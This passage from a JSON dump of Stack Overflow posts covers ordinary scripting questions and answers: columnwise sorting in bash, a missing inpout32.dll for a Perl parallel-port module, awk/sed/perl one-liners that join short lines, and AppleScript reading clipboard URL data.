downvoters...</strong></p>\n\n<p><a href=\"https://i.stack.imgur.com/BRrld.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/BRrld.png\" alt=\"Proof that is working for the skeptics...\"></a></p>\n\n<p><strong>2nd run with 6 columns:</strong></p>\n\n<pre><code>$ col=6; for i in $(seq ${col}); do cut -f$i &lt;(sed 's/^ \\+//g;s/ \\+/\\t/g' data2) | sort -n; done | pr -${col}ts | tr '\\t' '  '                 \n232.000000 504.000000 868.000000 1656.000000 56.000000 16.000000\n244.000000 516.000000 872.000000 1668.000000 68.000000 28.000000\n488.000000 1236.000000 984.000000 2388.000000 788.000000 704.000000\n600.000000 1348.000000 1116.000000 2500.000000 900.000000 816.000000\n2340.000000 3088.000000 1704.000000 4240.000000 2640.000000 2556.000000\n2588.000000 3336.000000 1716.000000 4488.000000 2888.000000 2804.000000\n</code></pre>\n\n<p><a href=\"https://i.stack.imgur.com/AZrUj.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/AZrUj.png\" alt=\"enter image description here\"></a></p>\n"}], "owner": {"reputation": 25, "user_id": 9460698, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/27e012cb7ac752af8c6c25c9af0d971c?s=128&d=identicon&r=PG&f=1", "display_name": "Y. Du", "link": "https://stackoverflow.com/users/9460698/y-du"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 95, "favorite_count": 1, "accepted_answer_id": 49185941, "answer_count": 2, "score": 0, "last_activity_date": 1520586645, "creation_date": 1520558103, "last_edit_date": 1520583329, "question_id": 49185119, "link": "https://stackoverflow.com/questions/49185119/how-to-sort-a-group-of-data-in-a-columnwise-manner", "title": "How to sort a group of data in a columnwise manner?", "body": "<p>I have a group of data like the attached <strong>raw data</strong>, when I sort the raw data by <strong>sort -n</strong> , the data were sorted line by line, the output looks like this:</p>\n\n<pre><code> 3  6  9  22\n 2  3  4  5\n 1  7  16 20\n</code></pre>\n\n<p>I want to sort the data in a columnwise manner, the output would look like this:</p>\n\n<pre><code> 1  2  4  3\n 3  6  9  16\n 5  7  20 22\n</code></pre>\n\n<p>Ok, I did try something.</p>\n\n<p>My primary ideal is to extract the data columnwise and then sort and then paste them, but I can't get through. Here is my script:</p>\n\n<pre><code>for ((i=1; i&lt;=4; i=i+1)) \ndo \n     awk '{print $i}' file | sort -n &gt;&gt;output\ndone\n</code></pre>\n\n<p>The output:</p>\n\n<pre><code>1  7  20 16\n3  6  9  22\n5  2  4  3\n1  7  20 16\n3  6  9  22\n5  2  4  3\n1  7  20 16\n3  6  9  22\n5  2  4  3\n1  7  20 16\n3  6  9  22\n5  2  4  3\n</code></pre>\n\n<p>It seems that <em>$i</em> is unchangeable and equals to $0</p>\n\n<p>Thanks a lot.</p>\n\n<pre><code> raw data1\n\n 3  6  9  22\n 5  2  4  3\n 1  7  20 16\n\nraw data2\n\n488.000000 1236.000000 984.000000 2388.000000 788.000000 704.000000\n600.000000 1348.000000 872.000000 2500.000000 900.000000 816.000000\n232.000000 516.000000 1704.000000 1668.000000 68.000000 16.000000\n244.000000 504.000000 1716.000000 1656.000000 56.000000 28.000000\n2340.000000 3088.000000 868.000000 4240.000000 2640.000000 2556.000000\n2588.000000 3336.000000 1116.000000 4488.000000 2888.000000 2804.000000\n</code></pre>\n"}, {"tags": ["perl", "module"], "comments": [{"owner": {"reputation": 15175, "user_id": 18097, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/71ae61f3d92a5bfed2ec863dc2a2a246?s=128&d=identicon&r=PG", "display_name": "Robert P", "link": "https://stackoverflow.com/users/18097/robert-p"}, "edited": false, "score": 0, "creation_date": 1520548711, "post_id": 49183630, "comment_id": 85373206, "body": "This might be due to the version of Perl you&#39;re using. What does <code>perl -V</code> say?"}], "answers": [{"comments": [{"owner": {"reputation": 3, "user_id": 9464736, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ecd09345b94d3528cf0af580b24e3295?s=128&d=identicon&r=PG&f=1", "display_name": "Wirenth", "link": "https://stackoverflow.com/users/9464736/wirenth"}, "edited": false, "score": 0, "creation_date": 1520667303, "post_id": 49183915, "comment_id": 85417997, "body": "It seems to work ! The inpout32.dll can be found at <a href=\"http://www.highrez.co.uk/downloads/inpout32/\" rel=\"nofollow noreferrer\">highrez.co.uk/downloads/inpout32</a> and I just put it in the system32 folder. Thank you !"}], "tags": [], "owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "is_accepted": true, "score": 1, "last_activity_date": 1520549969, "last_edit_date": 1592644375, "creation_date": 1520549969, "answer_id": 49183915, "question_id": 49183630, "link": "https://stackoverflow.com/questions/49183630/error-when-using-a-newly-installed-module-with-perl-5-26/49183915#49183915", "title": "Error when using a newly installed module with Perl 5.26", "body": "<p>According to the <a href=\"https://metacpan.org/pod/Device::ParallelPort::drv::win32\" rel=\"nofollow noreferrer\">Device::ParallelPort::drv::win32</a> docs...</p>\n<blockquote>\n<p>Standard installation, but you also need &quot;inpout32.dll&quot; which may require either putting into your windows System directory, or at the location of your executable.</p>\n<p>inpout32.dll actually comes from a 3rd party source and is freely available.</p>\n<p><a href=\"http://www.logix4u.net/inpout32.htm\" rel=\"nofollow noreferrer\">http://www.logix4u.net/inpout32.htm</a></p>\n</blockquote>\n<p>Unfortunately that site appears to no longer work. You'll have to find another source.</p>\n<p>If you wanted to get ambitious, you could patch the module to handle this automatically and, if the DLL's license allows, ship with the DLL. Or write an <a href=\"https://metacpan.org/pod/Alien\" rel=\"nofollow noreferrer\">Alien</a> wrapper module.</p>\n"}], "owner": {"reputation": 3, "user_id": 9464736, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ecd09345b94d3528cf0af580b24e3295?s=128&d=identicon&r=PG&f=1", "display_name": "Wirenth", "link": "https://stackoverflow.com/users/9464736/wirenth"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 202, "favorite_count": 0, "accepted_answer_id": 49183915, "answer_count": 1, "score": 0, "last_activity_date": 1520549969, "creation_date": 1520548514, "last_edit_date": 1520549612, "question_id": 49183630, "link": "https://stackoverflow.com/questions/49183630/error-when-using-a-newly-installed-module-with-perl-5-26", "title": "Error when using a newly installed module with Perl 5.26", "body": "<p>I have just installed Strawberry Perl 5.26 on a Win32 machine (XP), and installed Device::ParallelPort (with cpanm, and the installation is OK).</p>\n\n<p>When I try to use the module, I have :</p>\n\n<pre><code>    Device::ParallelPort unabel to create driver auto (see Device::ParallelPort::drv::auto for further information) - Device::ParallelPort::\ndrv::auto (auto detect) error\nfailed to load win32 - Can't locate Device/ParallelPort/drv/win32.pm in @INC (you may need to install the Device::ParallelPort::drv::win\n32 module) (@INC contains: Q:/APPS/Perl-5.26/perl/site/lib/MSWin32-x86-multi-thread-64int Q:/APPS/Perl-5.26/perl/site/lib Q:/APPS/Perl-5\n.26/perl/vendor/lib Q:/APPS/Perl-5.26/perl/lib) at (eval 3) line 2.\nBEGIN failed--compilation aborted at (eval 3) line 2.\n. Make sure you have loaded and installed Device::ParallelPort::drv::win32 from CPAN. Install Device::ParallelPort::drv::(linux|parport|\nwin32) and try again at (eval 2) line 3.\n at Q:\\VirtualDiskII\\Perl\\testlpt.pl line 25.\n</code></pre>\n\n<p>So I have installed Device::ParallelPort::drv::win32 (and the installation is OK). When trying to use the module, I have :</p>\n\n<pre><code>    Device::ParallelPort unabel to create driver auto (see Device::ParallelPort::drv::auto for further information) - Device::ParallelPort::\ndrv::auto (auto detect) error\nfailed to load win32 - Failed to load inpout32.dll - Can't create Inp32 2 - Une requ\u00dbte d'envoi ou de r\u00daception de donn\u00daes n'a pas \u00dat\u00da a\nutoris\u00dae car le socket n'est pas connect\u00da et (lors de l'envoi sur un socket datagramme en utilisant un appel sendto) aucune adresse n'a\n\u00dat\u00da fournie. at Q:/APPS/Perl-5.26/perl/site/lib/Device/ParallelPort/drv/win32.pm line 75.\n. Make sure you have loaded and installed Device::ParallelPort::drv::win32 from CPAN. Install Device::ParallelPort::drv::(linux|parport|\nwin32) and try again at (eval 2) line 3.\n at Q:\\VirtualDiskII\\Perl\\testlpt.pl line 25.\n</code></pre>\n\n<p>Any ideas ?</p>\n\n<p>Thank you by advance !</p>\n"}, {"tags": ["bash", "perl", "awk", "sed"], "comments": [{"owner": {"reputation": 6955, "user_id": 6136214, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/0385d5a1c27a6707139e7dc7ad29b6d6?s=128&d=identicon&r=PG&f=1", "display_name": "agc", "link": "https://stackoverflow.com/users/6136214/agc"}, "edited": false, "score": 0, "creation_date": 1520607252, "post_id": 49183359, "comment_id": 85397595, "body": "Please specify what should happen if <code>printf &#39;%s\\n&#39;foobar a b c d  &gt; source.txt</code>.  That is, should the output be the equivalent of <code>printf &quot;%s\\n&quot; foobara bc d</code>, or <code>printf &quot;%s\\n&quot; foobarabcd</code>, or what?"}], "answers": [{"comments": [{"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 1, "creation_date": 1520548965, "post_id": 49183426, "comment_id": 85373294, "body": "I completely agree with your intro, but I wonder if it is better captured with <code>{printf &quot;%s%s&quot;, (length &gt;= 5 ? sep : &quot;&quot;), $0; sep = ORS}END{printf &quot;%s&quot;,sep}</code> :) Or even <code>length &gt;= 5 { printf &quot;%s&quot;, sep } { printf &quot;%s&quot;, $0; sep = ORS; } END { printf &quot;%s&quot;, sep }</code>"}, {"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "reply_to_user": {"reputation": 12326, "user_id": 1125159, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/3b5e38afbccf47011db011b392f8a178?s=128&d=identicon&r=PG", "display_name": "Powers", "link": "https://stackoverflow.com/users/1125159/powers"}, "edited": false, "score": 0, "creation_date": 1520552970, "post_id": 49183426, "comment_id": 85374640, "body": "@Powers you&#39;re welcome. See <a href=\"https://stackoverflow.com/help/someone-answers\">stackoverflow.com/help/someone-answers</a> for what to do once you&#39;ve considered all of the solutions you receive."}], "tags": [], "owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "is_accepted": false, "score": 4, "last_activity_date": 1520552921, "last_edit_date": 1520552921, "creation_date": 1520547506, "answer_id": 49183426, "question_id": 49183359, "link": "https://stackoverflow.com/questions/49183359/delete-newline-character-in-text-file-if-next-line-is-less-than-a-certain-length/49183426#49183426", "title": "Delete newline character in text file if next line is less than a certain length", "body": "<p>As in life, in software it's much easier to do things based on what has happened rather than what will happen. Don't think of any problem has needing to do X if the NEXT line contains Y, think of it as needing to do Z if the CURRENT line contains Y and then the solution is always simple and obvious, e.g.:</p>\n\n<pre><code>$ cat tst.awk\nNR&gt;1{ printf \"%s%s\", prev, (length() &lt; 5 ? \"\" : ORS) }\n{ prev = $0 }\nEND{ print prev }\n\n$ awk -f tst.awk file\nhi hi hi hi hibye\nfun fun fun fun fun\nbatman\nshirt shirt shirt\npants pants pantsbelt\npaper paper paper\n</code></pre>\n\n<p>In the above we print a newline if the CURRENT line length is 5 or more. It's clear and simple and will work with any awk in any shell on any UNIX box.</p>\n"}, {"comments": [{"owner": {"reputation": 12326, "user_id": 1125159, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/3b5e38afbccf47011db011b392f8a178?s=128&d=identicon&r=PG", "display_name": "Powers", "link": "https://stackoverflow.com/users/1125159/powers"}, "edited": false, "score": 0, "creation_date": 1520548969, "post_id": 49183509, "comment_id": 85373296, "body": "Works perfectly!  Can you add a little explanation?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1520731895, "post_id": 49183509, "comment_id": 85435643, "body": "You have it backwards. <code>\\r?\\n</code> is only useful on unix (to handle both unix and Windows files). <code>\\n</code> will handle both unix and Windows files on Windows."}, {"owner": {"reputation": 2010, "user_id": 6499160, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a483ab21be9d3892e9b29047b1b3afb1?s=128&d=identicon&r=PG&f=1", "display_name": "wolfrevokcats", "link": "https://stackoverflow.com/users/6499160/wolfrevokcats"}, "edited": false, "score": 0, "creation_date": 1520733993, "post_id": 49183509, "comment_id": 85435938, "body": "When I was writing about old versions of perl for Windows I actually meant cygwin perl, I just didn&#39;t recall that at once. I used cygwin perl quite a long ago, so that&#39;s where it came from. And I&#39;ve just checked: cygwin based perl still has that quirk."}], "tags": [], "owner": {"reputation": 2010, "user_id": 6499160, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a483ab21be9d3892e9b29047b1b3afb1?s=128&d=identicon&r=PG&f=1", "display_name": "wolfrevokcats", "link": "https://stackoverflow.com/users/6499160/wolfrevokcats"}, "is_accepted": true, "score": 2, "last_activity_date": 1520552657, "last_edit_date": 1520552657, "creation_date": 1520547860, "answer_id": 49183509, "question_id": 49183359, "link": "https://stackoverflow.com/questions/49183359/delete-newline-character-in-text-file-if-next-line-is-less-than-a-certain-length/49183509#49183509", "title": "Delete newline character in text file if next line is less than a certain length", "body": "<pre><code>perl -p0777e \"s{\\r?\\n(?=.{0,5}$)}{}mg\" test.txt\n</code></pre>\n\n<p><strong>output</strong></p>\n\n<pre><code>hi hi hi hi hibye\nfun fun fun fun fun\nbatman\nshirt shirt shirt\npants pants pantsbelt\npaper paper paper\n</code></pre>\n\n<p>[ Well it took me 2 minutes to write the one-liner and about an hour to explain. ]</p>\n\n<p>Here's the explanation:</p>\n\n<p><strong>Switches:</strong></p>\n\n<p><code>-p</code> - read every line of the input files, run the code specified by <code>-e</code> for each line, and print the variable <code>$_</code> (which is modified by the <code>-e</code> code)  </p>\n\n<p><code>-0[octal number]</code> - input line separator; if we specify 0777 the whole file will be considered a line and read at once</p>\n\n<p><code>-l</code> - strip input lines from ending <code>\\n</code>, set the <code>output line separator</code> equal to the <code>input line separator</code>. (I removed it, cause it's actually not needed here) </p>\n\n<p><strong>Now the regular expression:</strong></p>\n\n<pre><code>s{\\r?\\n(?=.{0,5}$)}{}mg\n</code></pre>\n\n<p><code>s{pattern}{replacement}</code> - search for <code>pattern</code> in variable <code>$_</code> and replace it with <code>replacement</code> </p>\n\n<p>pattern parts:</p>\n\n<p><code>\\r?\\n</code> - match every newline symbol. For Unix <code>\\n</code> would be enough, <code>\\r?</code> - optional match of CR that may be necessary for old perl versions under Windows.   Actually I think <code>\\r?</code> can be removed too.</p>\n\n<p><code>(?=pattern)</code> - a positive look-ahead match of <code>pattern</code>, a zero width match, that is it does not consume the characters. </p>\n\n<p><code>.{0,5}$</code> - match from zero to five characters ending with    </p>\n\n<p><code>s{}{}</code> operator modifiers: <code>m</code> - multiline matching, makes <code>$</code> match <em>just before</em> <code>\\n</code> everywhere in text, not only at the end of the line. \n<code>g</code> - global matching, replace every occurrence in the text.</p>\n\n<p><strong>Finally, how it all works:</strong> </p>\n\n<p>Perl slurps the whole file (<code>-0777</code>) and (<code>-p</code>), then it searches for every occurence of <code>\\r?\\n</code> that is followed by no more than 5 non-newline characters and a newline: <code>(?=.{0,5}$)</code>.<br>\nEvery occurrence is replaced by the empty string <code>{}</code>.</p>\n\n<p>I think I've been clear enough.</p>\n\n<p>Additional information can be obtained from: <code>perldoc perlre</code>, <code>perldoc perlop</code> , <code>perldoc perlrun</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 12326, "user_id": 1125159, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/3b5e38afbccf47011db011b392f8a178?s=128&d=identicon&r=PG", "display_name": "Powers", "link": "https://stackoverflow.com/users/1125159/powers"}, "edited": false, "score": 0, "creation_date": 1520549138, "post_id": 49183557, "comment_id": 85373364, "body": "This doesn&#39;t actually work on my machine (I&#39;m on a Mac).  It just prints out the same text file that was input without removing any newlines."}, {"owner": {"reputation": 96909, "user_id": 3030305, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/En2fP.png?s=128&g=1", "display_name": "John1024", "link": "https://stackoverflow.com/users/3030305/john1024"}, "reply_to_user": {"reputation": 12326, "user_id": 1125159, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/3b5e38afbccf47011db011b392f8a178?s=128&d=identicon&r=PG", "display_name": "Powers", "link": "https://stackoverflow.com/users/1125159/powers"}, "edited": false, "score": 0, "creation_date": 1520549293, "post_id": 49183557, "comment_id": 85373418, "body": "@Powers Sorry about that.  It works for me on Linux.  I just added to the end of the answer code that I expect will work on a Mac."}, {"owner": {"reputation": 46858, "user_id": 967492, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/526ea226101e199d029049dda22a4e58?s=128&d=identicon&r=PG", "display_name": "potong", "link": "https://stackoverflow.com/users/967492/potong"}, "edited": false, "score": 0, "creation_date": 1520592133, "post_id": 49183557, "comment_id": 85388741, "body": "The OP says ` delete the newline character if the next line is <i>less</i> than 5 characters`."}, {"owner": {"reputation": 96909, "user_id": 3030305, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/En2fP.png?s=128&g=1", "display_name": "John1024", "link": "https://stackoverflow.com/users/3030305/john1024"}, "reply_to_user": {"reputation": 46858, "user_id": 967492, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/526ea226101e199d029049dda22a4e58?s=128&d=identicon&r=PG", "display_name": "potong", "link": "https://stackoverflow.com/users/967492/potong"}, "edited": false, "score": 0, "creation_date": 1520621926, "post_id": 49183557, "comment_id": 85405952, "body": "@potong Good eye!  I just updated the answer for <i>less</i> than 5 characters."}, {"owner": {"reputation": 46858, "user_id": 967492, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/526ea226101e199d029049dda22a4e58?s=128&d=identicon&r=PG", "display_name": "potong", "link": "https://stackoverflow.com/users/967492/potong"}, "edited": false, "score": 0, "creation_date": 1520642042, "post_id": 49183557, "comment_id": 85413661, "body": "By swapping the <code>ba</code> for <code>ta</code> and adding <code>P;D</code> the sed script could change from slurping the file to reading no more than 2 lines at a time."}], "tags": [], "owner": {"reputation": 96909, "user_id": 3030305, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/En2fP.png?s=128&g=1", "display_name": "John1024", "link": "https://stackoverflow.com/users/3030305/john1024"}, "is_accepted": false, "score": 0, "last_activity_date": 1520621893, "last_edit_date": 1520621893, "creation_date": 1520548089, "answer_id": 49183557, "question_id": 49183359, "link": "https://stackoverflow.com/questions/49183359/delete-newline-character-in-text-file-if-next-line-is-less-than-a-certain-length/49183557#49183557", "title": "Delete newline character in text file if next line is less than a certain length", "body": "<p><code>sed</code> is also good for simple substitutions such as this:</p>\n\n<pre><code>$ sed -E ':a; N; s/\\n(.{,4})$/\\1/; ba' source\nhi hi hi hi hibye\nfun fun fun fun fun\nbatman\nshirt shirt shirt\npants pants pantsbelt\npaper paper paper\n</code></pre>\n\n<p>How it works:</p>\n\n<ul>\n<li><p><code>:a</code></p>\n\n<p>This defines a label <code>a</code>.</p></li>\n<li><p><code>N</code></p>\n\n<p>This reads in the next line and appends it (with a newline character) to the current contents of the pattern space.</p></li>\n<li><p><code>s/\\n(.{,4})$/\\1/</code></p>\n\n<p>If a newline character occurs within 4 characters before the end of the current line, then remove the newline</p></li>\n<li><p><code>ba</code></p>\n\n<p>If the above substitution command resulted in a change to the line, then jump back to label <code>a</code>.</p></li>\n</ul>\n\n<h3>BSD/MacOs</h3>\n\n<p>The above was tested with GNU sed.  For BSD/macOS sed, try:</p>\n\n<pre><code>sed -E -e :a -e N -e 's/\\n(.{,4})$/\\1/' -e ba source\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 1, "last_activity_date": 1520575553, "last_edit_date": 1520575553, "creation_date": 1520574556, "answer_id": 49187379, "question_id": 49183359, "link": "https://stackoverflow.com/questions/49183359/delete-newline-character-in-text-file-if-next-line-is-less-than-a-certain-length/49187379#49187379", "title": "Delete newline character in text file if next line is less than a certain length", "body": "<p>If you want to avoid slurping and you want to look ahead, the general solution is to buffer as many lines as you want to look ahead. One in this case.</p>\n\n<pre><code>perl -ne'\n   chomp;\n   if (length &gt;= 5) {\n      print \"$buf\\n\";\n   } else {\n      print $buf;\n   }\n\n   $buf .= $_;\n\n   END { print \"$buf\\n\" if defined $buf; }\n'\n</code></pre>\n\n<p>In this particular case, you can make do with the following:</p>\n\n<pre><code>perl -pe'chomp; print \"\\n\" if length &gt;= 5 &amp;&amp; $. &gt; 1; END { print \"\\n\" if $. }'\n</code></pre>\n\n<p>Both of these solutions handle inputs that don't have a line feed on the last line.</p>\n\n<p>See <a href=\"https://stackoverflow.com/q/41742890/589924\">Specifying file to process to Perl one-liner</a> for usage.</p>\n"}, {"tags": [], "owner": {"reputation": 2285, "user_id": 8592975, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/56fea54eef1c73000439a2c38b53d422?s=128&d=identicon&r=PG&f=1", "display_name": "ctac_", "link": "https://stackoverflow.com/users/8592975/ctac"}, "is_accepted": false, "score": 0, "last_activity_date": 1520615520, "creation_date": 1520615520, "answer_id": 49198837, "question_id": 49183359, "link": "https://stackoverflow.com/questions/49183359/delete-newline-character-in-text-file-if-next-line-is-less-than-a-certain-length/49198837#49198837", "title": "Delete newline character in text file if next line is less than a certain length", "body": "<p>You can try this sed (ok on OpenBSD)</p>\n\n<pre><code>sed -e '$b' -e 'N;/\\n...../{P;D' -e '};y/\\n/ /;s/ \\([^ ]*$\\)/\\1/' infile\n</code></pre>\n"}], "owner": {"reputation": 12326, "user_id": 1125159, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/3b5e38afbccf47011db011b392f8a178?s=128&d=identicon&r=PG", "display_name": "Powers", "link": "https://stackoverflow.com/users/1125159/powers"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 168, "favorite_count": 0, "accepted_answer_id": 49183509, "answer_count": 5, "score": 1, "last_activity_date": 1520629362, "creation_date": 1520547141, "last_edit_date": 1520629362, "question_id": 49183359, "link": "https://stackoverflow.com/questions/49183359/delete-newline-character-in-text-file-if-next-line-is-less-than-a-certain-length", "title": "Delete newline character in text file if next line is less than a certain length", "body": "<p>I'd like to create a script with any combination of bash, sed, awk, or perl that deletes the newline character of a line if the next line is less than a certain length.  Let's say we want to delete the newline character if the next line is less than 5 characters.  If we have this source text file:</p>\n\n<pre><code>hi hi hi hi hi\nbye\nfun fun fun fun fun\nbatman\nshirt shirt shirt\npants pants pants\nbelt\npaper paper paper\n</code></pre>\n\n<p>Here's the desired output:</p>\n\n<pre><code>hi hi hi hi hibye\nfun fun fun fun fun\nbatman\nshirt shirt shirt\npants pants pantsbelt\npaper paper paper\n</code></pre>\n\n<p>Here's a script that identifies all the lines that are less than 5 characters:</p>\n\n<pre><code>cat source.txt | awk 'length($0) &lt; 5 { print NR }'\n</code></pre>\n\n<p>It returns this.</p>\n\n<pre><code>2\n7\n</code></pre>\n\n<p>Here's a script that gets rid of the newlines (it's the line numbers from the previous script minus one):</p>\n\n<pre><code>perl -pe 'chomp if $.==1||$.==6' source.txt\n</code></pre>\n\n<p>How do I combine these two scripts?  Or is there a better way to solve this?</p>\n\n<p><strong>Update</strong></p>\n\n<p>There were multiple correct answers (some didn't work on my Mac, but I think they'd work on other machines).  Here's how long the correct answers took on my machine with a 769,811 line CSV file (40,000 lines had the newline character removed).</p>\n\n<ul>\n<li>Ed Morton's awk solution: 23.7 seconds</li>\n<li>wolfrevokcats perl with slurp: 4.5 seconds</li>\n<li>John1024's solution didn't work on my Mac (but think it works on other OSs)</li>\n<li>ikegami's perl without slurp: Killed the task after 7 minutes</li>\n</ul>\n"}, {"tags": ["perl", "text", "applescript", "decode", "encode"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1520573805, "post_id": 49183227, "comment_id": 85379745, "body": "Don&#39;t ever generate code like that. Pass arguments to a program as arguments, using env vars or some other means."}], "answers": [{"comments": [{"owner": {"reputation": 31, "user_id": 9464610, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oxSF7.png?s=128&g=1", "display_name": "iLoveCode", "link": "https://stackoverflow.com/users/9464610/ilovecode"}, "edited": false, "score": 0, "creation_date": 1520800985, "post_id": 49185746, "comment_id": 85453353, "body": "Thank you for the tutorial! \u2013 On a side note I heard back from the developer of the Things app and they said that they will let the &quot;Copy link&quot; command copy the link as plain text in the next update of Things v3.5, as opposed to putting HEX code into the clipboard as it is now."}, {"owner": {"reputation": 4547, "user_id": 9051006, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6ecd4d9aedf87d99e79b556db65d2d26?s=128&d=identicon&r=PG", "display_name": "CJK", "link": "https://stackoverflow.com/users/9051006/cjk"}, "reply_to_user": {"reputation": 31, "user_id": 9464610, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oxSF7.png?s=128&g=1", "display_name": "iLoveCode", "link": "https://stackoverflow.com/users/9464610/ilovecode"}, "edited": false, "score": 1, "creation_date": 1520845788, "post_id": 49185746, "comment_id": 85466298, "body": "@iLoveCode I tried out this answer to the problem you posted and it worked, so it&#39;s at least given you an interim solution to use until the <i>Things</i> update comes out.  I can&#39;t speak for you, but it does appear that user3439894 has successfully answered your question and that there are no other competing responses.  I also can&#39;t speak for user3439894, but I think selecting his/her answer would be a nice form of thanks, plus it would also help other users with a similar problem by directing them here to find a workable solution.  Good news on the <i>Things</i> update, though."}], "tags": [], "owner": {"reputation": 4536, "user_id": 3439894, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/QGRfR.png?s=128&g=1", "display_name": "user3439894", "link": "https://stackoverflow.com/users/3439894/user3439894"}, "is_accepted": true, "score": 1, "last_activity_date": 1520562864, "creation_date": 1520562864, "answer_id": 49185746, "question_id": 49183227, "link": "https://stackoverflow.com/questions/49183227/how-to-decode-hex-code-to-regular-text-in-apple-script/49185746#49185746", "title": "How to decode HEX code to regular text in Apple Script", "body": "<p>The following <em>example</em> <strong>AppleScript</strong> <em>code</em> is a <em>proof of concept</em> of how I'd handle setting to a <em>variable</em> a Things URL <em>link</em> that's saved to the clipboard as <code>\u00abdata url ...\u00bb</code> where <code>...</code> is Hex Data.</p>\n\n<p>This <em>script</em> writes the <code>\u00abdata url ...\u00bb</code> to a temporary file, reads the temporary file, which is now a text string of the <code>\u00abdata url ...\u00bb</code>, and sets it as a the <em>value</em> of a <em>variable</em>, and then deletes the temporary file. It then displays the Things URL <em>link</em> as a text string or displays a message that the clipboard did not contain a 'things:///show?id=' URL link.</p>\n\n<p><em>Example</em> <strong>AppleScript</strong> <em>code</em>:</p>\n\n<pre><code>if ((clipboard info) as string) contains \"URL\" then\n\n    set thingsURL to \"/tmp/thingsURL.tmp\"\n\n    try\n        set f to open for access thingsURL with write permission\n        set eof f to 0\n        write (the clipboard) to f\n        close access f\n    on error\n        close access f\n    end try\n\n    set thingsURLtext to (read thingsURL)\n    tell application \"System Events\" to delete file thingsURL\n\n    display dialog thingsURLtext buttons {\"OK\"} default button 1\n\nelse\n\n    display dialog \"The clipboard did not contain a 'things:///show?id=' URL link.\" buttons {\"OK\"} default button 1\n\nend if\n</code></pre>\n\n<hr>\n\n<p><strong>Note:</strong> The <em>example</em> <strong>AppleScript</strong> <em>code</em> is just that and does not employ any other <em>error handling</em> then what's shown and is meant only to show one of many ways accomplish a task. The onus is always upon the User to add/use appropriate <em>error handling</em> as needed/wanted.  </p>\n"}], "owner": {"reputation": 31, "user_id": 9464610, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oxSF7.png?s=128&g=1", "display_name": "iLoveCode", "link": "https://stackoverflow.com/users/9464610/ilovecode"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 372, "favorite_count": 0, "accepted_answer_id": 49185746, "answer_count": 1, "score": 2, "last_activity_date": 1520562864, "creation_date": 1520546596, "question_id": 49183227, "link": "https://stackoverflow.com/questions/49183227/how-to-decode-hex-code-to-regular-text-in-apple-script", "title": "How to decode HEX code 